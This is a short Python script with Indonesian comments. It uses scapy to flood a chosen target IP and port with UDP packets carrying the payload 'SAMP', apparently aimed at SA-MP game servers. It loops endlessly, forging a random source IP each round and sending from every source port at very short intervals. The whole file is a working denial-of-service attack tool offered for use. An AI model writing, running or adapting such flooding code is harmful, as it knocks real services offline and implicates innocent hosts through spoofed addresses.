import random
from scapy.all import *

target_IP = input("Masukkan alamat IP target: ")
port_target = input("Masukkan port target: ")
i = 1

while True:
    a = str(random.randint(1, 254))
    b = str(random.randint(1, 254))
    c = str(random.randint(1, 254))
    d = str(random.randint(1, 254))
    dot = "."
    source_IP = a + dot + b + dot + c + dot + d

    for source_port in range(1, 65535):
        payload = "SAMP"  # Ganti payload sesuai dengan yang Anda inginkan
        IP1 = IP(src=source_IP, dst=target_IP)
        UDP1 = UDP(sport=source_port, dport=port_target)
        pkt = IP1 / UDP1 / Raw(load=payload)
        send(pkt, inter=0.0001, verbose=False)  # Mengirimkan dengan interval 0.001 detik

        print("Paket terkirim", i)
        i = i + 1
